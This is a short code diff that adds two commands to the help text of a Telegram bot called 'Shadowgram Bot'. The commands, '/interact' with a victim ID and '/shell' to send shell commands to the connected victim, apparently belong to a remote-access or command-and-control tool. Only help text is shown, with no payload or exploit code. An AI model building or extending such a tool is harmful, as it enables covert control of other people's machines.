@@ -19,4 +19,6 @@ HELP_TEXT = r"""*🤖 Shadowgram Bot 1\.0 🤖*
 *List of Commands*:
 /start \- Starts the Shadowgram Bot
 /help \- Show this help message
+/interact `victim_id` \- Connect \& Interact with the given *Victim ID*
+/shell `commands` \- Send *shell command* to the connected Victim
 """
